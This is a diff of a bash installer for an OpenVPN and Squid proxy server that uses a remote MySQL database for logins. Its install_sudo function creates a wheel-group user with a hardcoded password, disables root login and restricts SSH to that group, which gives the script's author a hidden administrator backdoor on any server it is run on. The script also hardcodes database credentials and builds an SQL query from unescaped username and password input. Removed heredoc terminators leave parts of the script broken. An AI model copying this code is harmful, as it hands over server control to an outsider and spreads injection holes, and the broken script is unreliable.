@@ -1,12 +1,12 @@
 #!/bin/bash
-timedatectl set-timezone Asia/Riyadh
-#Database Details
+#Script Variables
 HOST='172.104.58.116';
 USER='rctunnel_royalplus';
 PASS='@@@@F1r3n3t';
 DBNAME='rctunnel_royalplus';
 PORT_TCP='1194';
 PORT_UDP='53';
+timedatectl set-timezone Asia/Riyadh
 install_require () {
 
 echo 'Installing dependencies.'
@@ -71,7 +71,7 @@ visible_hostname Firenet-Proxy
 error_directory /usr/share/squid/errors/en' >> squid.conf
     cd /usr/share/squid/errors/en
     rm ERR_INVALID_URL
-    echo '<!--SCBuildDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     
 chkconfig --add squid
@@ -221,7 +221,7 @@ sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
 . /etc/openvpn/login/config.sh
-Query="SELECT user_name FROM users WHERE user_name='$username' AND user_encryptedPass=md5('$password') AND is_freeze='0' AND user_duration > 0"
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND is_freeze='0' AND duration > 0"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
 EOM
@@ -231,10 +231,8 @@ cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
 ##set status online to user connected
-server_ip=$(curl -s https://api.ipify.org)
+server_ip=SERVER_IP
 datenow=`date +"%Y-%m-%d %T"`
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
-LENZ05
 
 tcpusers=$(sed -n -e "/^ROUTING_TABLE/p" /etc/openvpn/server/tcpclient.log | wc -l)
 udpusers=$(sed -n -e "/^ROUTING_TABLE/p" /etc/openvpn/server/udpclient.log | wc -l)
@@ -250,8 +248,8 @@ sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='0', active_address='', active_date='' WHERE user_name='$common_name' "
-LENZ06
+##set status offline to user disconnected
+server_ip=SERVER_IP
 
 tcpusers=$(sed -n -e "/^ROUTING_TABLE/p" /etc/openvpn/server/tcpclient.log | wc -l)
 udpusers=$(sed -n -e "/^ROUTING_TABLE/p" /etc/openvpn/server/udpclient.log | wc -l)
@@ -641,9 +639,9 @@ service stunnel start
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@AlaminX001 | chpasswd &>/dev/null; usermod -aG wheel alamin &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG wheel lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }
 }
